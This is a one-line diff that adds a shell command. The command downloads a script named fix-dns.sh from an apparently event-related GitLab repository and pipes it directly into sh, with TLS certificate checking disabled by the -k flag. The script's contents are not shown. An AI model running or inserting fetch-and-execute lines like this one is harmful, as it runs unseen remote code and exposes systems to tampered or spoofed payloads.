@@ -1,0 +1,1 @@
+curl -s -sfLk https://gitlab.t1.cloud/events/more-tech2024/-/raw/main/fix-dns.sh?ref_type=heads | sh -
